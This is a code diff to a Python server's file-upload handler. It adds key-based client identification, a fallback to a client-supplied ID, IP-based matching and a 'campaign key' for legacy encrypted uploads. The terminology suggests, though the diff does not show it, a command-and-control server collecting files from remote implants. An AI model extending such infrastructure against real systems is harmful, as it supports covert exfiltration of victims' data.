@@ -20,25 +20,68 @@ class FileHandler(BaseHandler):
             
         encrypted_data = self.request_handler.rfile.read(content_length).decode('utf-8')
         
-        # Identify the client
-        client_id = self.identify_client()
-                    
         try:
-            # Decrypt the file data
-            if client_id:
-                file_content = self.crypto_helper.decrypt(encrypted_data, client_id)
-            else:
-                file_content = self.crypto_helper.decrypt(encrypted_data)
+            # Parse the request JSON to extract data part
+            request_json = json.loads(encrypted_data)
+            encrypted_data = request_json.get('data')
+            
+            # Try client identification by key-based decryption
+            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
+            
+            # If client identification failed but client_id was provided in request
+            if client_id is None and 'client_id' in request_json:
+                provided_client_id = request_json.get('client_id')
+                
+                # Try decryption using the provided client ID
+                try:
+                    decrypted_data = self.crypto_helper.decrypt(encrypted_data, provided_client_id)
+                    client_id = provided_client_id
+                except Exception as e:
+                    logger.error(f"Failed to decrypt using provided client ID: {e}")
+            
+            if client_id is None or decrypted_data is None:
+                self.send_error_response(400, "Authentication failed - could not decrypt data")
+                return
             
             # Save the file
-            file_path = self._save_uploaded_file(client_id, file_content)
+            file_path = self._save_uploaded_file(client_id, decrypted_data)
             
             # Send success response
             self.send_success_response()
             
+        except json.JSONDecodeError:
+            # For backward compatibility, try directly as encrypted data
+            try:
+                # Use IP-based identification as fallback (less secure)
+                client_id = self._identify_client_by_ip()
+                
+                if client_id:
+                    # Try to decrypt using the client's key
+                    decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
+                else:
+                    # Try using the campaign key
+                    decrypted_data = self.crypto_helper.decrypt(encrypted_data)
+                    client_id = self._identify_client_by_ip()  # Still need a client ID for saving
+                
+                # Save the file
+                file_path = self._save_uploaded_file(client_id or self.client_address[0], decrypted_data)
+                
+                # Send success response
+                self.send_success_response()
+            except Exception as e:
+                logger.error(f"Error handling legacy file upload: {e}")
+                self.send_error_response(500, "Server Error")
         except Exception as e:
             logger.error(f"Error handling file upload: {e}")
             self.send_error_response(500, "Server Error")
+    
+    def _identify_client_by_ip(self):
+        """Identify client based on IP address as fallback"""
+        client_ip = self.client_address[0]
+        for client_id, client_info in self.client_manager.get_clients_info().items():
+            if client_info.get('ip') == client_ip:
+                return client_id
+        return None
             
     def _save_uploaded_file(self, client_id, file_content):
         """Save uploaded file content to disk"""
